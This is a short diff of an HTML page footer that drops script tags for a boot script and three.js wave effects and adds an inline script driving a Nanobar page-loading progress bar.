-<script src="/js/next-boot.js"></script>
-
-
-  <script defer src="/lib/three/three.min.js"></script>
-    <script defer src="/lib/three/three-waves.min.js"></script>
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
+  <script>
+    var options = {
+      classname: 'nanobar',
+      id: 'myNanobar'
+    };
+    var nanobar = new Nanobar(options);
+    nanobar.go(30);
+    nanobar.go(76);
+    nanobar.go(100);
+  </script>
 
 </body>
+
 </html>
